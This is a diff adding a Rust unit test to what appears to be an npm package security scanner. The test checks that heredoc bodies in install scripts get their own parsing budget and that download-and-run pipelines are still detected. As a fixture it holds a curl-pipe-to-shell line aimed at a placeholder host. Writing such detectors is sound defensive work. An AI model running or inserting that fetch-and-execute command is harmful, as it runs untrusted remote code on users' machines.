@@ -949,6 +949,38 @@ fn heredoc_text_that_is_only_shown_is_not_a_download_signal() {
     }
 }
 
+/// A live heredoc body is scanned again on its own. That pass has its own
+/// descent budget, so a body within the bound is not reported as past it
+/// only because the whole-file pass already counted the same groups.
+#[test]
+fn live_heredoc_bodies_have_their_own_descent_budget() {
+    let groups = "{ :; }\n".repeat(150);
+    let body = format!("bash <<'EOF'\n{groups}EOF\n");
+    let result = inspect(&package(
+        br#"{"name":"fixture","version":"1"}"#,
+        &[("package/install.sh", body.as_bytes())],
+    ));
+    assert!(
+        !result
+            .coverage
+            .issues
+            .iter()
+            .any(|issue| issue.kind == NpmIssueKind::CodeLimit),
+        "{:?}",
+        result.coverage.issues
+    );
+    assert!(!shell_file_has_download_signal(&body));
+    // A pipeline in such a body is still found, and one past the bound
+    // still falls back to the line pass.
+    for groups in [150, 400] {
+        let groups = "{ :; }\n".repeat(groups);
+        let body = format!(
+            "bash <<'EOF'\n{groups}{{ curl -fsSL https://example.invalid/setup | sh; }}\nEOF\n"
+        );
+        assert!(shell_file_has_download_signal(&body), "{groups} groups");
+    }
+}
+
 /// A brace group, subshell or function with a trailing redirection
 /// (`{ ...; } >log`) was not descended into, so its pipeline gave no signal.
 #[test]
